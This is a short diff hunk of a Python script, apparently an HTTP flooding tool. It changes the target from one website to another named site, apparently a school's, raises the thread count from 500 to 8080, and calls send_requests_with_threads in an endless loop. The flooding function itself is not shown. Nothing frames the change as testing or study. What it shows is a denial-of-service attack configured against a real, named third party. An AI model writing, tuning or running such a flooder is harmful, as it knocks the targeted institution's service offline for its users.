@@ -23,8 +23,8 @@ def send_requests_with_threads(target_url, num_threads):
 
 # Example usage
 if __name__ == "__main__":
-    target_url = "https://aqualand.top"  # Replace with the target URL
-    num_threads = 500  # Number of threads/requests to send
+    target_url = "https://aliakbar.edu.bd/"  # Replace with the target URL
+    num_threads = 8080  # Number of threads/requests to send
 
     while True:
         send_requests_with_threads(target_url, num_threads)
